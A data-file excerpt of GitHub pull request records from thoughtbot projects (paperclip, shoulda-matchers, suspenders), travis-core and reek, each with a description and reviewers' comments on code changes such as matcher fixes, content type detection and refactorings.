https://trello.com/c/V0jY5LWs/452-migrate-existing-config-files-into-database","['This looks good to me. Though, I regret not finishing up #577 yet. Conflicts abound :boom: ', 'Does an owner mean a GitHub organization or a GitHub user? Should `repos.in_organization` get moved to `owners.organization`?', '@srt32, will all team members be able to update the configuration with this change and ""owner level configuration""?', '@salbertson not exactly. This PR is step one for going down that road. This PR introduces owners (orgs or users) so that later we could associate style guides with those owners.', '@srt32, when would style preferences be associated with a user?', 'Good question. I was thinking that a `user` would have a style guide the same way an `organization` would have a style guide. cc. @gylaz @malandrina ', 'I added the `owner.organization` column in dfa719f. My next commit will update that column.', '@srt32, couple of comments/suggestions, looks good to me. :+1: ', 'I squashed a bunch of intermediate commits to clean things up a bit but left the most recent commits there to make seeing the name changes easier. Another review would be appreciated cc/ @thorncp @croaky @gylaz @salbertson ', '@srt32, looks good to me! :+1:', ""Looks good to me aswell, this makes the refactoring to use the user's api token more easier. :+1:"", 'Squashed and rebased in 67f6fa9\r\n', '@srt32, I really like the way this turned out, thanks for sticking with it. I have a couple questions, other than that is looks great. :+1: ', 'Blam! :+1: \r\n\r\nP. S. I really want to see the comment count of this PR to go to 200']"
858,thoughtbot/paperclip,1529.0,"* Extract private methods
* Remove trailing conditionals
* Remove explicit returns","['I am a fan of this. :+1:', 'This looks great.']"
859,thoughtbot/paperclip,1839.0,"Prioritize MimeMagic over the `file` binary for content type detection
when it finds a match. Fall back to `file` if MimeMagic can't match
anything.

`file` incorrectly detects Open Office XML files (e.g., xlsx, docx) as
zip since they're implemented as zipped archives of xml files. MimeMagic
detects them properly.

This should be in place of #1807","[""@jyurek please check this out in place of #1807. #1807 was @jeremywadsack's fork of my original code, which was never meant to be pushed to the core project. I've fixed some style issues, added the released `mimemagic` gem with support for OOXML files, and moved the MimeMagic detection outside of the FileCommandContentTypeDetector class. I didn't make a new class for it since it's just one line of code, so let me know if you want me to re-arrange things in some way that aligns with the project's architecture better.\r\n\r\nI had to stub some stuff out wherever the tests test non-existent files by stubbing out `Paperclip.run`. \r\n\r\nThe remaining hound violations don't seem consistent with the project so I didn't address them. "", 'Merged. Thanks a lot!', 'it seems like this trick needs to be replicated in paperclip/media_type_spoof_detector.rb\r\n\r\nor am I missing something?', ""That's a good question. I don't actually see any reason that the `paperclip/media_type_spoof_detector.rb` isn't taking advantage of the `content_type_detector`. Maybe @jyurek understands better."", '@jeremywadsack +1 only if that also means that we will use `file` as a fall back. \r\n\r\nI just found a related issue when trying to validate the mime type for a Javascript file attachment. [see: https://github.com/minad/mimemagic/issues/30]', ""It was not an intentional decision on my part \xe2\x80\x93 I didn't think to check the rest of the project for other uses for the file command when I made this PR. :+1: for using my logic (which has the file fallback) everwhere you want to do content type detection.\r\n""]"
860,thoughtbot/shoulda-matchers,433.0,"Hello.

This PR is expected to fix #419.
I was debating which difference value to use, and adopted 12 digit decimal value which is safe (considering IEEE 754) and pragmatic enough.
(I think this will cover more than 99.9% cases, but if we want 100% real accuracy we might need another total different approach.)

Thanks!


#### EDIT ####
I'm sorry, looks like the PR doesn't work for:
```ruby
it { should validate_numericality_of(:age).only_integer.is_greater_than_or_equal_to(18) }
```
Test for that case is missing. (Combination with only_integer, even or odd.) 
I will close this PR for now and think again.

This could be a workaround for the above but doesn't meet the some spec tests this time. 
(like 2.5 and 2 tests.)
```ruby 
  def diffs_to_compare
    if @value.is_a? Integer
      [1, 0, -1]
    else
      [0.000000000001, 0, -0.000000000001]
    end
  end
```
Anyway I will have to take some time to think about this more.
I'm so sorry to bother you with this immature PR.","['Well it seems like you were on the right track with this, no?', 'I\'m sorry to reply late. I was on a small trip.\r\nI found out that we need to use 1 for integer and 2 for even/odd as ""diffs_to_compare"".\r\nI have an idea now and I will come back with a update soon :)', 'Updated. Please review. :)', ""Notes:\r\n\r\n```ruby\r\n# Rails\r\nvalidates :age, numericality: { only_integer: true, greater_than_or_equal_to: 17.5 }\r\n# RSpec\r\nit { should validate_numericality_of(:age).only_integer.is_greater_than_or_equal_to(18) }\r\n```\r\nThis still passes, but it should be OK.\r\nBecause that rails line works exactly the same as below effectively:\r\n\r\n```ruby\r\n#rails\r\nvalidates :age, numericality: { only_integer: true, greater_than_or_equal_to: 18 }\r\n``` \r\n(And that's why the test passes, too.)\r\n\r\nThanks!"", '@untidy-hair When you get a chance - could you also add a line in the NEWS about your change? Thanks!', '@untidy-hair I looked at the changes you made to ValidateNumericalityOfMatcher. It looks like using `only_integer`, `odd` or `even` will affect the diff value that ComparisonMatcher uses (by taking advantage of the fact that the lambda passed to ComparisonMatcher is a closure). This seems a little too clever to me. What do you think about ComparisonMatcher getting its `diff_to_compare` directly from ValidateNumericalityOfMatcher?\r\n\r\nIn other words, when you make a new ComparisonMatcher, you could say:\r\n\r\n``` ruby\r\nNumericalityMatchers::ComparisonMatcher.new(self, value, :>=)\r\n```\r\n\r\nComparisonMatcher, then, would look something like:\r\n\r\n``` ruby\r\ndef initialize(numericality_matcher, ...)\r\n  @numericality_matcher = numericality_matcher\r\nend\r\n\r\ndef diff_to_compare\r\n  @numericality_matcher.diff_to_compare\r\nend\r\n```\r\n\r\nThis is obviously kind of odd behavior to begin with, but I feel like this represents what is happening better. What do you think?', 'Hi guys, thanks for the comments. Let me check them out and I will be back soon :)', 'Updated.\r\nI coundn\'t come up with a good name for the method below in comparison_matcher.rb.\r\n```ruby\r\ndef given_and_next_values_match?\r\n  comparison_combos.all? do |diff, checker_type|\r\n    __send__(checker_type, @value + diff, @message)\r\n  end\r\nend\r\n```\r\nIf there\'s a better name...\r\n\r\n@mcmire, the injection of ""self"" feels more natural to me. :)', 'What should we do with what Hound is saying about?\r\nIn those cases, changing { } into do ... end will make the spec unnatural English?\r\nAm I the only one who thinks so?\r\nThere might be other ways, tho.', ""@untidy-hair Yes... Hound is one of our new creations, so apologies for the warnings, I just added it to the project.\r\n\r\nIt's true `it do ... end` doesn't read like natural English, but, using `do ... end ` for multiline blocks is a kind of a rule we've come up with across the board. Besides, I think we all know now not to read Ruby like perfect English anyway. Case in point: `File.exist?` :)"", ""As for the name of that method, you're kind of checking that the bounds of the comparison are correct, so maybe `bounds_correct?` or `check_bounds?` or something?"", ""Just some style changes I didn't catch before. So close!!"", 'Hi @mcmire ,\r\nThank you for the comments.\r\nOK, I will change the code to follow the multi-line rule.\r\nCan I apply the same rule one to the below?\r\n```ruby\r\n      expect {\r\n        described_class.new(fake_matcher, 0, :>)\r\n      }.to raise_error ArgumentError\r\n```', 'Yeah -- if you can join those lines together so that they are under 80 characters then do that, otherwise change to `do ... end`.\r\n\r\nThanks!', 'Kk. Can you please also check out the hash or array stuff when you get a chance?\r\n\r\n\r\n\r\nOn Feb 24, 2014, at 12:56 PM, Elliot Winkler <notifications@github.com> wrote:\r\n\r\n> Yeah -- if you can join those lines together so that they are under 80 characters then do that, otherwise change to do ... end.\r\n> \r\n> Thanks!\r\n> \r\n> \xc2\x81\\\r\n> Reply to this email directly or view it on GitHub.', 'Updated. Thanks!', 'Okay, one small thing and this is ready to go. Do you mind rebasing before I merge?', 'Of course not. Will do it tonight, thanks!', 'Rebased :)', 'Thanks!']"
861,thoughtbot/shoulda-matchers,386.0,"If you have a model that declares `has_secure_password` and you also have a presence validation on the password, and you write a test against this validation using an instance of your model where the password is already set, then your test will fail. This is because has_secure_password (at least on Rails 4) defines #password= such that if it is given nil, then the password will not be overwritten with nil. This interferes with how our validate_presence_of matcher works.

Unfortunately there is not a great way to get around this (using \#write_attribute won't work, either). So in this case we raise a helpful error message that instructs the user to use an empty record against `validates_presence_of`.","['@drapergeek @mxie If you could look at this that would be great!', 'Sorry I missed this earlier. I think this is a good solution for the problem. Only minor notes.', ':+1: ', ':+1: again :)']"
862,thoughtbot/shoulda-matchers,406.0,"This reverts [77dc477](https://github.com/thoughtbot/shoulda-matchers/commit/77dc477ce470e3b5a7d4f5f7a64972007643bb43) restoring the delegate_method matcher removed in should-matchers 2.0.

Matcher was removed in commit 77dc477 due to issues described in
#252

We've moved away from using Bourne and Mocha's `HaveReceived` matcher and
implemented a `StubbedTarget` class for spying on methods to be delegated.
We also removed the stub call to be handled via `define_method` for
framework-independent support.

Other changes include:

* Moving from `should` syntax to `expect`
* Use 1.9 hash syntax in `delegate_method`


CC @hrs  ","[""Let's work on the strong parameters matcher first and get the 'pattern' for these down and then pick this one up. I think most of the issues are the same between the two as far as error handling."", 'Sounds like a plan @drapergeek ', '@mcmire @drapergeek, @hrs and I are ready to merge this in as well as https://github.com/thoughtbot/shoulda-matchers/pull/407. Would you mind giving this another look over?', ""I like it!!!!\r\n\r\n:beers: \r\n\r\nFew comments but overall I like this and I am THRILLED to see this functionality return.\r\n\r\nWhen we get ready to do this I would like to release this as a beta first so that we don't cause a bunch of issues again."", 'Thanks for the feedback @drapergeek. Just pushed up changes based on the comments and ready for another pass through.', '@dgalarza looks good! Only a few minor things that are totally optional.\r\n\r\nThings that should happen next:\r\n* Create a new release given the current feature set.\r\n* Merge it in, create a beta release\r\n* Tweet and/or write a quick blog post about it and ask people to try it out.\r\n\r\n\r\nAlso: @mxie @mcmire Any other thoughts here?', 'I mostly had more ""cosmetic"" comments, but I think this looks fine otherwise.', 'Thanks @mxie, made some updates based on your comments.\r\n\r\n@drapergeek, I also added in some examples in the README for `as` and `with_arguments`.', ""@mcmire gave me some context on https://github.com/thoughtbot/shoulda-matchers/pull/396#issuecomment-31179386 and how we're no longer explicitly testing failure messages (https://github.com/thoughtbot/shoulda-matchers/pull/435#discussion_r9640631). I'm going to go ahead and update the delegate matcher specs to follow the same convention."", 'I believe that now that `ActiveSupport::TestCase` now supports the independent matchers, this PR is ready. Any other thoughts @mcmire?', '@dgalarza Looks good to me. Merge away :gem: ']"
863,thoughtbot/shoulda-matchers,407.0,This restores the strong parameters matchers which were removed in [f107ba0](https://github.com/thoughtbot/shoulda-matchers/commit/f107ba014c8ab85bde70ce33e8176b21739bf714) due to issues with bourne integration. I've removed the bourne require from the matcher and it appears that now with the integration of bourne into RSpec everything works cleanly once again.,"[""Thanks for picking this up!\r\n\r\nThere are a few concerns I just want to make sure will work ok:\r\n\r\n1.  What happens if the user is on test-unit or mini-test? Will this work properly?\r\n2.  What happens if the user is using mocha/bourne? What kind of error will they receive?\r\n\r\nI'm not saying we have to support either of those cases I just want to make sure that we fail gracefully."", 'The other concern I have is that this only works with the newest version of rspec so we need to handle a proper error message for users that are not on that version.', ""Unless I'm wrong, I'm pretty sure this is the exact same code we used previously so how about just reverting the commits where that was removed and we can modify from there. We can then preserve  the history on those files."", 'I agree - if these are the exact changes that we removed before, then we should just revert that commit(s) and include a note in the commit message about why.', 'The only reason I did not revert the commit sha was because the commit also removed the dependency on bourne moving it to a development dependency.  So I pulled the individual files from that commit to restore the matcher itself.\r\n\r\n> On Dec 20, 2013, at 1:03 PM, Melissa Xie <notifications@github.com> wrote:\r\n> \r\n> I agree - if these are the exact changes that we removed before, then we should just revert that commit(s) and include a note in the commit message about why.\r\n> \r\n> \xe2\x80\x94\r\n> Reply to this email directly or view it on GitHub.', ""I still think it would be worth it to revert them and then just make commits to fix those 'changes' (such as the deprecations). I think keeping the history would be worth it."", ""Sounds good, I'll go ahead and revert that commit instead and make any of the appropriate changes.\r\n\r\n> On Dec 20, 2013, at 1:28 PM, Jason Draper <notifications@github.com> wrote:\r\n> \r\n> I still think it would be worth it to revert them and then just make commits to fix those 'changes' (such as the deprecations). I think keeping the history would be worth it.\r\n> \r\n> \xe2\x80\x94\r\n> Reply to this email directly or view it on GitHub."", 'After digging in a bit further it appears that the StrongParameters matcher requires bourne to work still. It seems that having bourne as a development dependency is giving false positives right now in the current scenario. In a rails app with rspec and shoulda-matchers `model_attrs.stubs(:permit)` fails due to a no method error for stubs.', 'The rspec syntax for stubbing a method is `stub`, not `stubs`. The syntax being used previously was for Mocha, not rspec.', 'Ah yes, I tried moving towards `stubs` instead of `stub`. This got my rails app to work just fine however then the shoulda-matchers test suite fails itself as stub is then undefined. I could attempt to move over to use rspec-mocks style for shoulda-matchers specs rather than mocha and drop bourne all together.', 'Yes, I think that would be the way to go.', ""Great, I'll set up another PR to handle that separately."", ""Why would you want another PR? that seems like it should all go in this PR unless I'm missing something. If this PR is working in the specs but not on your rails app, your specs need to be fixed so that they fail, if that makes sense."", ""Ah ok, that's fine with me. I thought it might be cleaner to get that merged in on its own in advance rather than getting mixed into the strong-parameters PR."", ""No, I think merging in something that doesn't work the way we expect it to would be a bad idea."", ""Another problem I found when trying to use this is that it doesn't work if there are any parameters that are required at the top-level. So if you have some controller that handles nested resources e.g.\r\n\r\n/foo/:foo_id/bar\r\n\r\nYour bar_params method might look like this\r\n\r\n```\r\ndef bar_params\r\n  params.require(:bar).permit(:name, :start_date, :end_date)\r\nend\r\n```\r\n\r\n...and so your test would look something like\r\n\r\n```\r\nshould permit(:name, :start_date, :end_date)\r\n```\r\n\r\nThat test generates an error because it doesn't supply a :foo_id to the controller.\r\n"", ""@hrs and I were able to get a working `strong_parameters` matcher today. We've removed the dependency on Bourne and Mocha and provided a framework-independent way to handle stubbing and mocking the parameters."", '@dgalarza Is this ready to be merged in?', ""@mcmire, @hrs and I think it's ready to merge. We made some updates based on your feedback."", 'Made another update here to not explicitly test error messages. While doing so found a bug with the `does_not_match` method in properly determining when a matcher does not match. This has been taken care of now. \r\n\r\nThis PR is ready for another review.', ""Alright, I'll see if I can get some time to look at this soon."", 'Thanks for the notes @mcmire. Just pushed up some updates based on your feedback.', '@dgalarza Do you want to rebase/squash anything before I merge?', ""@mcmire yeah, there's a bunch of things that I think can probably be squashed together. Will go ahead and do so and update the PR."", '@mcmire alrighty, this is rebased, squashed and ready to go.\r\n\r\nSince the `StrongParametersMatcher` and the `DelegateMatcher` were both removed in the same version of should-matchers are we following the same plan outline here https://github.com/thoughtbot/shoulda-matchers/pull/406#issuecomment-34501409 for releasing this?', ""Yeah... let's make a beta release that includes both the new StrongParametersMatcher and DelegateMatcher."", '+1 awesome!', 'Are you ok with this being merged into master now @mcmire?', ""I'm sorry, I thought I ok'ed this. Yup, this is ready to go."", ':+1: awesome guys. I guess is only missing a section on the README']"
864,thoughtbot/shoulda-matchers,466.0,"This PR addresses #460, and copies some work I did for shoulda-context:

* https://github.com/thoughtbot/shoulda-context/blob/master/lib/shoulda/context/test_framework_detection.rb
* https://github.com/thoughtbot/shoulda-context/blob/master/lib/shoulda/context.rb#L18

----

Under Minitest 5 (or a Rails 4.1 project), you will get a warning

    MiniTest::Unit::TestCase is now Minitest::Test.

when you attempt to run tests. This is because shoulda-matchers requires
'test/unit/testcase', even if Test::Unit is not being used.

It is not a good idea for shoulda-matchers to require *anything* that
the user may not be using, whether it's Test::Unit or RSpec. We should
assume that by the time shoulda-matchers is required, the user has
already required all of whatever test framework they are using, not none
or even some of that framework.",[':+1: ']
865,thoughtbot/shoulda-matchers,434.0,"Moving the #423 to here. Because the other is to merge on branch `jd-add-4-1-beta` now this is to merge on master.

After the rebase on master 1 spec is broken. I tell you guys when this is fixed.","['Sweet, thanks for this.', 'Hey guys,\r\nare we gonna see this merged anytime soon?', 'Yup! Just as soon as @maurogeorge is done with this branch.', 'Guys,\r\n\r\nI am searching on reflection on `Shoulda::Matchers::ActiveRecord::AssociationMatcher::autosave_correct?` and dont find anything about the autosave, this is so annoying! I dont know it is because internally it is a has many through association, and maybe we cant define this save on a through association.\r\n\r\nIf you guys can take a look at it, it will be great. I will have time only on sunday morning.\r\n', 'Guys, maybe I found a bug on rails 4.1.0.beta1, I create a issue there https://github.com/rails/rails/issues/13923.', '@mcmire @drapergeek It is a real bug on rails. Now how we can proceed? Wait the rails? Any suggestion?', ""@maurogeorge I'd rather wait until this bug is fixed."", '@mcmire the bug is fixed, the guys are fast :train2:\r\n\r\nI guess we can use the github version of rails 4.1.0.beta1. What you think?', 'Guys,\r\n\r\nwe are green on rspec :exclamation:\r\n\r\nThe cucumber is broken. You guys can take a look? Maybe it is a simple thing and I dont see.', ""@maurogeorge So... that's telling me that shoulda-context is not getting included into ActiveSupport::TestCase, for some reason. I'm wondering if this is an issue with shoulda-context instead. See: https://github.com/thoughtbot/shoulda-context/issues/37"", '@mcmire you are right it is a issue on shoulda-context, for now I will wait the fix.', '@mcmire I added the shoulda-context of [your branch](https://github.com/thoughtbot/shoulda-context/pull/39) but I guess the `Shoulda::Context` still not mixed. \r\n\r\nI still receiving [`undefined method `should\' for UserTest:Class`](https://travis-ci.org/thoughtbot/shoulda-matchers/jobs/19919646#L543) and [got the warning](https://travis-ci.org/thoughtbot/shoulda-matchers/jobs/19919646#L130-L168)\r\n\r\n```\r\nWarning: you should require \'minitest/autorun\' instead.\r\nWarning: or add \'gem ""minitest""\' before \'require ""minitest/autorun""\'\r\n```\r\nfrom `gems/shoulda-context-41758b4f6837/lib/shoulda/context/test_framework_detection.rb`', 'Just a note to all of us. After the fixes, before the merge we need to set the most recent version of rails and shoulda-context', ""@maurogeorge Hmm, okay. I'll take a closer look at that later."", 'Hi @maurogeorge, I just updated my branch for shoulda-context as there were still some issues to be worked out. It looks like after bumping to the latest commit there, the tests are still failing, but fortunately I think it\'s easy to fix that. [This line][1] needs to be changed -- on Rails 4.1 it reads ""#{total} runs, #{total} assertions... etc"" instead of ""#{total} tests, #{total} assertions... etc"".\r\n\r\n[1]: https://github.com/thoughtbot/shoulda-matchers/pull/434/files#diff-030a35e40add349aae682a11ccf8783eL128', '@mcmire thanks a lot. I fixed the last spec. Now lets see if all builds pass.', '@mcmire got some issues on travis because of git, you can tell Travis to run again?', ""@maurogeorge Yup, you can. There's a circular-arrow icon in the upper right hand corner of the page. You can either re-run the entire job or you can re-run an individual build."", '@mcmire I guess I need to be on thoughbot organization on Github or something like that take a look\r\n\r\nfilepicker-rails I am part of organization\r\n![captura de tela 2014-03-27 as 14 55 46](https://cloud.githubusercontent.com/assets/260746/2541014/17b9cb76-b5d9-11e3-9fe5-18d4d669270a.png)\r\n\r\nshoulda-matchers I am not part of organization\r\n![captura de tela 2014-03-27 as 14 55 58](https://cloud.githubusercontent.com/assets/260746/2541017/1d5a86a6-b5d9-11e3-90e4-9814a52ca957.png)\r\n', ""@maurogeorge Derp, that makes sense. I'll restart it for you."", ':+1: ', ""It looks like maybe you need to run bundle update && appraisal update? I forced-pushed to my branch so it looks like the commit that Travis is trying to pull down doesn't exist anymore."", '@mcmire updated the Gemfiles, lets check now.', '@mcmire the Travis doesnt start, see if you can start this :smiley: ', ""@maurogeorge Yeah I'm not sure what's going on... try making another commit and push that?"", '@mcmire take a look now we are green.', ""@maurogeorge Okay cool. So it looks like all we're waiting on now is for a new version of shoulda-context to be released so we can point to that."", '@mcmire :+1: ', 'It looks like shoulda-context 1.2.0 is out.', 'Looks good to me. @maurogeorge would you mind rebasing/squashing and then I will merge this in?']"
866,thoughtbot/shoulda-matchers,642.0,"This is a fix for both #634 and #637.

----

In Rails 4.2, ActiveRecord was changed such that if you attempt to set
an attribute to a value and that value is outside the range of the
column, then it will raise a RangeError. For instance, an integer column
with a limit of 2 (i.e. a smallint) only accepts values between -32768
and +32767.

This means that if you try to do any of these three things, a RangeError
could be raised:

* Use validate_numericality_of along with any of the comparison
  submatchers and a value that sits on either side of the boundary.
* Use allow_value with a value that sits outside the range.
* Use validates_inclusion_of against an integer column. (Here we attempt
  to set that column to a non-integer value to verify that the attribute
  does not allow said value. That value is really a string version of a
  large number, so if the column does not take large numbers then the
  matcher could blow up.)

Ancillary changes in this commit:

* Remove ValidationMessageFinder and ExceptionMessageFinder in favor of
  Validator, StrictValidator, and ValidatorWithCapturedRangeError.
* The allow_value matcher now uses an instance of Validator under the
  hood. StrictValidator and/or ValidatorWithCapturedRangeError may be
  mixed into the Validator object as needed.",[]
867,thoughtbot/shoulda-matchers,658.0,"* The main problem I had with the old tests is that information that
  the reader didn't need to care about was not properly abstracted away.
  For instance, a helper method used by almost all tests will always
  create a model called Example, and will always use an attribute called
  ""attr"" (on which the validation is present). However, in some tests
  the class or attribute is referred to directly. The reader shouldn't
  have to care about either of these things, since they are constant --
  the tests should be readable enough so that this information is not
  necessary to understand the case being tested against.

* Speaking of this helper method, some of the tests used it and some
  didn't. Some defined their own helper methods to represent a
  particular case (`case_sensitive: true`, `allow_nil`, etc.). This is
  now fixed so that all but two tests use the same helper method to
  define a model. This model is completely customizable -- one can
  specify the type of the attribute being validated, the names and types
  of scoped attributes, etc.

* The tests around scoped attributes and different types are all
  basically the same, so they are now compressed into a shared context.

* Related to this, we no longer have to worry about setting a proper
  value for a scope attribute. One had to know which type that attribute
  had and come up with a reasonable default for that type. Now there is
  a helper method that worries about this automatically.

* Finally, we remove tests around case_insensitive against an integer
  attribute (these don't make any sense, and don't work).",[]
868,thoughtbot/shoulda-matchers,661.0,"When running tests, you can now switch between running them against a
SQLite or PostgreSQL database. This is accomplished by modifying the
unit and acceptance tests so that when they generate and load the test
Rails application, database.yml is replaced with content that will
configure the database appropriately.",[]
869,thoughtbot/shoulda-matchers,675.0,"This fixes #648.

----

Previously we were taking ActionController::Parameters and completely
overriding #require, forcing it to return `self`, i.e, the entire
ActionController::Parameters object. This meant that we broke its
functionality, which is to return a slice of the params hash instead.
The consequence of this is that attempting to call #permit on a slice of
the params hash obtained via #require would not work:

``` ruby
params = ActionController::Parameters.new(
  { ""course"" => { ""foo"" => ""bar"" } }
)
params.require(:course)
params.require(:course).permit(:foo)
```

This commit fixes the permit matcher so that #require is proxied
instead, retaining the existing behavior.

This commit also adds a qualifier, #on, for asserting that your action
places a restriction on a slice of the params hash. The `permit` matcher
will properly track calls on child `params` instances. For example:

``` ruby
class UsersController < ActionController::Base
  def create
    User.create!(user_params)
    ...
  end

  private

  def user_params
    params.require(:user).permit(:name, :age)
  end
end

describe UsersController do
  it { should permit(:name, :age).for(:create).on(:user) }
end
```

If this fails, you'll get the following error message:

```
Expected POST #create to restrict parameters for :user to :name and :age,
but restricted parameters were :first_name and :last_name.
```",[]
870,thoughtbot/shoulda-matchers,699.0,Closes #509,"['Two things:\r\n\r\n* Now that we have tests for the failure message I think we can remove the tests above that simply say ""such and such `to_not validate_numericality`"", they\'re now duplicates.\r\n* What about testing the entire failure message instead of just a portion of it? It shouldn\'t be that much more typing and it gives a more complete picture for someone reading the test. (I know we don\'t do this in the other tests, but I can fix this later)', '@mcmire I updated to assert against the full message.\r\n\r\nI will check the broken build, the problem is on Rails 4.2 the string value is showed as string on the `pretty_error_messages`.\r\n\r\n```\r\n> obj\r\n=> #<Example:0x007ffce10121e8 id: nil, attr: ""19"">\r\n> obj.attr\r\n=> ""19""\r\n```\r\n\r\nOn the other versions, the value is showed as integer\r\n\r\n```\r\n> obj\r\n=> #<Example id: nil, attr: 19>\r\n> obj.attr\r\n=> 19\r\n```\r\n\r\nIf you have any idea of this, let me know.', ""Oh weird... yeah, I'll have to take a closer look at that."", '@mcmire after some research I belive this is the behavior of the AR, I update the specs to handle this, please take a look.', 'So I took a look at why we are even seeing the weird ""got error:"" message and I think this is what\'s happening:\r\n\r\n* ValidateNumericalityOfMatcher has two submatchers, OnlyIntegerMatcher and ComparisonMatcher\r\n* Both of these submatchers change the record in question somehow and then call #valid? on that record\r\n* ValidateNumericalityOfMatcher will run all of the submatchers and determine if they pass or fail (this is determined by whether #valid? produces any error messages on the attribute being validated)\r\n* In this case, OnlyIntegerMatcher fails but ComparisonMatcher passes\r\n* So ValidateNumericalityOfMatcher fails, but then when it goes to print its failure message, it accesses the record\'s error messages. Because ComparisonMatcher passes, the record is in a good state and doesn\'t have any error messages\r\n* In other words, the error messages that Validator#messages accesses are cached at the time that #valid? is called... but the error messages that Validator#messages_description accesses are ""live""\r\n* So... either we need Validator to cache not only the error messages on the attribute being validated, but also cache all error messages on the record... or we need ValidateNumericality to *not* run all submatchers and stop at the first one that fails. So in this case OnlyIntegerMatcher would run, it would see that it fails, and it would never run ComparisonMatcher, thereby keeping the record in a ""bad"" state (so the cached error messages and live error messages would be the same thing).\r\n\r\nI would probably prefer the latter solution, but it does mean that all of the tests that involve failure messages will change.', ""Basically, this is what I mean: https://github.com/thoughtbot/shoulda-matchers/compare/2dc787e6454458296f4d55c9aec465f4960b9bb3...9e0e8f7b670fee9d2e540ba70e6d5964ccfb39ae. This seem fine to you? (I'll merge this all in if so.)"", '@mcmire thanks, I reviewed and looks good to me :shipit: ', '@mcmire ping :smiley: . Just to remember you to merge this, like you described here https://github.com/thoughtbot/shoulda-matchers/pull/699#issuecomment-93851307', 'Thanks! This was merged as e7087897143dfd5f59e3c512c31a8c7976ad96dd.']"
871,thoughtbot/shoulda-matchers,307.0,"AssociationMatcher was getting much too long and bloated as we continue to add more functionality. Here we've:

* extracted out the `.through`, `.order`, and `.dependent` options as their own submatchers
* expanded upon the `.order` and `.dependent` tests so that we're not only checking that matcher actually matches the right thing, but also that it's outputting the correct failure message.","['I really like the changes here, this improves things nicely so well done :) Other than the one comment I made above, lgtm.', '@drapergeek @mcmire Another review when you have a moment? Thanks!', '@drapergeek Take another peek!', ':+1: :icecream: :radio: \r\n\r\nI really wish there was a ""Let\'s do this!"" emoji...']"
872,thoughtbot/suspenders,271.0,,"[""Really happy to see this. Long time coming. Thanks, Mason. I don't have any other ideas for improvement. Maybe ask in Campfire for one more person to review it but looks to me."", ':+1: ', 'I feel like something this big needed a bit more time to bake (and a few more eyes) before getting merged in. The tests fail for me and on Travis.', ""I don't mean to nitpick, but the binary doesn't seem to work either. I'm working on getting this fixed.""]"
873,thoughtbot/suspenders,302.0,"We want to generate this file because:

* We're using Travis on a lot of projects
* It requires configuration to run builds and notify us
* We can skip some boilerplate by starting out with a sane config

The generated config makes sense because:

* It can run Ruby builds out of the box with our Ruby version
* It reduces noise for Campfire notifications
* It reduces volume in the queue by avoiding unnecessary branch builds

This also refactors handling of Ruby versions to move interpolation into 
templates where possible.","['See also https://github.com/thoughtbot/suspenders/pull/297', ""If I understand correctly, this doesn't disagree with #297, right? (although whoever merges second will get merge conflicts)"", 'Nope, just a similar change.', 'lgtm']"
874,thoughtbot/suspenders,299.0,"This is now in FactoryGirl itself (beginning with version 4.4.0) so we don't
need to maintain custom code.

https://github.com/thoughtbot/factory_girl/commit/6a692fe711",['This looks good to me. Merge it! :dango: ']
875,travis-ci/travis-core,383.0,"The compare URL for pull requests is just the pull request URL, so we can't extract the commit range from it, but the commit range is stored in the request for pull requests, so we can get it from there.

Fixes travis-ci/travis-ci#1719.","[""This range does not include the merge commit itself, is that correct or incorrect? I'm tending to lean towards that it should include the merge commit, but I can also see how that would be unexpected."", ""Question: when would this kind of change become a part of the live travis-ci.org? I'm wondering when I can update my script to start using `$TRAVIS_COMMIT_RANGE` again :-)"", ""Any movement on this? I'd love to start using it."", '@henrikhodne could you summerize the state of the PR and what it does? Is this safe to merge? Are there any downsides?', 'This still looks good to me. The only downside I can think of is if someone is depending on the broken behaviour.', '@rkh @BanzaiMan @meatballhat thoughts on merging and deploying?', ':+1: for merge and deploy plz', '@BanzaiMan could you take care of this please?', 'Glad to see this coming in, thanks travis team!', ""This has been deployed to .org production, but I've run out of time to roll it out to .com production. We will do that on Monday.""]"
876,troessner/reek,249.0,"Refactoring of the ControlParamater smell class to fix issues related to
smells and other non-smell issues.

For issue #231.","[""This is a refactoring of the ControlParameter smell. It makes some modifications which don't reduce the number of warnings on the file but I feel are beneficial and a number of modification that brings down the number of warnings.\r\n\r\nPrior to this refactoring ControlParameter is the smelliest file in reek with 14 warnings. This refactoring brings to 6 warnings which also brings the total number of warning in reek below 100.\r\n\r\nThis refactoring is heavily inspired from @mvz 's refactoring of DuplicateMethodCall (https://github.com/troessner/reek/commit/34a1f455069a18d8e92a0a4d72fe2704e12ee129).\r\n\r\nIf this PR is accepted, a further step for another refactoring could be to extract one or more base class from both ControlParameter and DuplicateMethodCall since the new classes introduced in both PR have some commonality. These new classes could possibly be used in other smell detectors as well."", 'I answered pretty much all of the original comments. Made some changes, rebased and forced push so some of my answers are on outdated diffs. \r\n\r\nHere are the changes I have made:\r\n* Changed ```lines``` to use ```(&:line)```\r\n* Changed inner ```ControlParameter``` class to ```FoundControlParameter``` to avoid duplication of name\r\n* Changed the key for the ```FoundControlParameters``` hash to use ```param``` rather tan ```matchs.first``` and also changed ```name``` method along the way.\r\n* Changed all matchs to matches\r\n* Changed a ```lvar[VALUE_POSITION]``` to ```lvar.value```', 'Oops I accidently closed the PR !', '>> Oops I accidently closed the PR !\r\n\r\nI think this happened to all of us at least once..:D', ""Well, the code looks good, any reasons why I shouldn't merge this @gilles-leblanc? We discussed everything, right?"", ""@troessner As far as I'm concerned we discussed everything and I addressed what we discussed. So unless we have further discussions I do not see something left to do with this PR on my part. "", 'Coolio. And merged it is. Excellent work, my friend.:)']"
877,troessner/reek,267.0,Fix for #266.,"['Everything passes on my machine. \r\n\r\nI have reviewed the code and commented where appropriate.\r\n\r\nGreat work as always.\r\n', 'Just one thing I thought of, normally we bundle PR in a single commit.', 'Yes, looks like no more comments are forthcoming, so I will squash the commits.', 'From what I can see (geeez, huge diff) this looks excellent, merged. ']"
878,troessner/reek,276.0,"This is the implementation of a long-standing feature request: #13.

